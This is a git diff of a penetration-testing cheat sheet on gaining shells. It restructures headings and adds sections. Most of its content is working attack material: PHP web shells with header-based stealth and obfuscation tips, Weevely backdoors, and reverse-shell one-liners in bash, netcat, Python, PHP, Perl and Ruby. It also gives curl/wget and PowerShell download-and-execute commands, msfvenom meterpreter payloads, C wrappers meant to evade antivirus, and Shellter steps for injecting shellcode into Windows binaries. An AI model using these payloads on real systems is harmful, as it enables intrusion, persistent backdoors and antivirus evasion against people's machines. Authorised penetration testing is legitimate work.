@@ -1,6 +1,6 @@
 # General - Shells
 
-### Detect packets filtering
+### Detect firewall filtering
 
 ###### Outgoing traffic blocking
 
@@ -24,9 +24,9 @@ If ICMP packets are received but TCP packets aren't then TCP may be blocked.
 
 ### Web Shells
 
-###### PHP
+#### PHP
 
-**Basic**  
+###### Basic  
 
 Basic PHP code to execute system commands through GET parameters:
 
@@ -38,17 +38,17 @@ Basic PHP code to execute system commands through GET parameters:
 <?php if($_GET['cmd']) { preg_replace('/.*/e', $_GET['cmd'], ''); } ?>
 ```
 
-**Stealthy**  
+###### Stealthy  
 
 Instead of passing the commands through the URL, which would appear in logs,
-header-paramters can be used.
+heades parameters can be used:
 
 ```php
 $_SERVER['HTTP_ACCEPT_LANGUAGE']
 $_SERVER['HTTP_USER_AGENT']
 ```
 
-**Obfuscation**  
+###### Obfuscation  
 
 The following functions can be used to obfuscate the code.
 
@@ -60,7 +60,7 @@ gzdeflate()
 str_rot13()
 ```
 
-**phpbash**  
+###### phpbash
 
 phpbash is a simple standalone, semi-interactive web shell.  
 Upload the phpbash.php or phpbash.min.php file on the target and access it
@@ -68,7 +68,7 @@ with any Javascript-enabled web browser to achieve RCE.
 
 https://github.com/Arrexel/phpbash
 
-**Weevely**  
+###### Weevely  
 
 Weevely is a password protected web shell designed for post-exploitation
 purposes that can be extended over the network at runtime.
@@ -92,9 +92,10 @@ Generated backdoor with password 'mypassword' in 'agent.php' of 671 byte size.
 ./weevely.py http://<TARGET>/agent.php mypassword
 weevely>
 ```
+
 ### Reverse Shells
 
-###### Setup a listener on host
+#### Listener on host
 
 ```
 # TCP
@@ -107,9 +108,9 @@ nc -lvnpu <PORT>
 python icmpsh_m.py <HOST_IP> <TARGET_IP>
 ```
 
-###### One-liners reverse shell commands
+#### One-liners reverse shell
 
-**Bash**
+###### Bash
 
 ```bash
 bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
@@ -118,7 +119,7 @@ exec /bin/sh 0</dev/tcp/<IP>/<PORT> 1>&0 2>&0
 0<&196;exec 196<>/dev/tcp/<IP>/<PORT>; sh <&196 >&196 2>&196
 ```
 
-**Netcat**
+###### Netcat
 
 ```bash
 # If nc e option available:
@@ -127,7 +128,7 @@ nc -e /bin/sh <IP> <PORT> &
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
 ```
 
-**Python**
+###### Python
 
 ```python
 # TCP
@@ -137,7 +138,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-**PHP**   
+###### PHP   
 
 ```php
 # This code assumes that the TCP connection uses file descriptor 3.
@@ -149,19 +150,19 @@ php -r '$s=fsockopen("<IP>",<PORT>);system("/bin/sh -i <&3 >&3 2>&3");'
 php -r '$s=fsockopen("<IP>",<PORT>);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
 ```
 
-**Perl**
+###### Perl
 
 ```perl
 perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-**Ruby**
+###### Ruby
 
 ```ruby
 ruby -rsocket -e'f=TCPSocket.open("<IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
-###### In memory scripts injection
+#### In-memory injection
 
 The scripts needs to be hosted on a webserver, which can be done using
 python:
@@ -170,7 +171,7 @@ python:
 python -m SimpleHTTPServer <PORT>
 ```
 
-**Powershell**  
+###### Powershell  
 
 The Nishang powershell scripts can be used to get a reverse shell. https://github.com/samratashok/nishang  
 The following commands will load directly in memory the powershell script hosted
@@ -184,7 +185,7 @@ powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('
 powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellIcmp.ps1'); Invoke-PowerShellIcmp -IPAddress <IP>
 ```
 
-**PHP**  
+###### PHP
 
 The pentestmonkeys php-reverse-shell script can be used to leverage a reverse
 shell.  
@@ -193,38 +194,60 @@ The following commands will load directly in memory the script hosted
 on the remote webserver and execute it:
 
 ```php
+curl http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php
+wget -qO- http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php
+
+# Through PHP code injection
+# The system call be replaced with various PHP functionalities detailed above.  
 system('curl http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php')
 system('wget -qO- http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php')
 ```
 
-The *system* call be remplaced with various PHP functionalities detailed above.  
 
-###### Optional - Get TTY
+#### Binary
+
+If reverse shell must be made through a binary the following c code can be used:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+	system("<SHELLCODE_ONELINER");
+	return 0;
+}
+```
+
+The binary must be compiled on the same architecture as the target (advised to
+use the same OS and kernel for Linux targets).
+
+#### (Optional) TTY
 
 ```
 /bin/sh -i
 /bin/bash -i
 echo os.system('/bin/bash')
--
+
 # Python
 python -c 'import pty; pty.spawn("/bin/sh")'
 python3 -c 'import pty; pty.spawn("/bin/sh")'
--
+
 # Perl
 perl -e 'exec "/bin/sh";'
--
+
 # From within IRB
 exec "/bin/sh"
--
+
 # From within vi
 :!bash
 :set shell=/bin/bash:shell
--
+
 # With nmap
 !sh
 ```
 
-###### Optional - Get auto-completion and commands history
+#### (Optional) Auto-completion and commands history
+
   - Set host terminal to raw with echo unset:
   `*ctrl-z* stty raw -echo`
   - If TERM environment variable is not set on target shell:
@@ -239,7 +262,7 @@ It communicates over the stager socket and provides a comprehensive
 client-side Ruby API.   
 It features command history, tab completion, channels, and more.
 
-###### Handler
+#### Handler
 
 When using a meterpreter payload, a handler must be started on the host machine.
 
@@ -263,7 +286,9 @@ msf> set ExitOnSession false
 msf> exploit -j
 ```
 
-###### Meterpreter over PowerShell
+#### PowerShell
+
+######  Invoke-Shellcode
 
 The msfvenom and Invoke-Shellcode tools can be used to leverage a meterpreter
 on the target through powershell and in memory execution. This can be used to
@@ -290,9 +315,31 @@ msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=
 powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-Shellcode.ps1'); Invoke-Shellcode -Force;
 ```
 
+#### Binary
 
+To generate binaries using msfvenom (that will get flagged by most anti-virus):
 
-###### Unicorn w/ PowerShell
+```
+msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o <FILE>.exe
+msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o <FILE>.exe
+```
+
+The following C code can be used to compile a binary that will escape some
+anti-virus:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+	system("powershell.exe -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http:///<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-Shellcode.ps1'); Invoke-Shellcode -Force;");
+	return 0;
+}
+```
+
+### Anti-Virus bypass
+
+#### (Windows / PowerShell) Unicorn
 
 Magic Unicorn is a tool for using a PowerShell downgrade attack and inject
 shellcode (custom, cobalt or meterpreter) straight into memory.
@@ -316,4 +363,70 @@ msfconsole -r unicorn.rc
 
 # On target
 # Execute the powershell command contained in the powershell_attack.txt file
+```
+#### (Windows / binary) Shellter
+
+Shellter is a dynamic shellcode injection tool, and the first truly dynamic PE
+infector ever created.  
+It can be used in order to inject shellcode into native Windows applications
+(currently 32-bit applications only). The shellcode can be self made or
+generated within Shellter through a framework, such as Metasploit.
+
+The following builtin shellcodes are currently supported:
+
+```
+Meterpreter_Reverse_TCP
+Meterpreter_Reverse_HTTP
+Meterpreter_Reverse_HTTPS
+Meterpreter_Bind_TCP
+Shell_Reverse_TCP
+Shell_Bind_TCP
+WinExec
+```
+
+The procedure to create a binary is as follow:
+
+```
+$ shellter.exe
+
+Choose Operation Mode - Auto/Manual (A/M/H): A
+Perform Online Version Check? (Y/N/H): N
+
+PE Target: <BINARY_TO_INJECT_INTO>
+
+[...]
+
+# Check if the chosen binary match the OS version attacked
+Minimum Supported Windows OS: 4.0
+
+# Stealth Mode preserves the original functionality of the infected PE file, so "Stealth" refers to the human factor.
+# If you just need a backdoor don't enable this feature.
+Enable Stealth Mode? (Y/N/H): N
+
+************
+* Payloads *
+************
+[1] Meterpreter_Reverse_TCP   [stager]
+[2] Meterpreter_Reverse_HTTP  [stager]
+[3] Meterpreter_Reverse_HTTPS [stager]
+[4] Meterpreter_Bind_TCP      [stager]
+[5] Shell_Reverse_TCP         [stager]
+[6] Shell_Bind_TCP            [stager]
+[7] WinExec
+# L: One of the above payload
+# C: Custom shellcode, a file path must be provided
+Use a listed payload or custom? (L/C/H): L
+Select payload by index: 1
+
+***************************
+* meterpreter_reverse_tcp *
+***************************
+SET LHOST: <HOSTIP>
+SET LPORT: <HOSTPORT>
+Payload: meterpreter_reverse_tcp
+
+[...]
+
+Injection: Verified!
+Press [Enter] to continue...
 ```
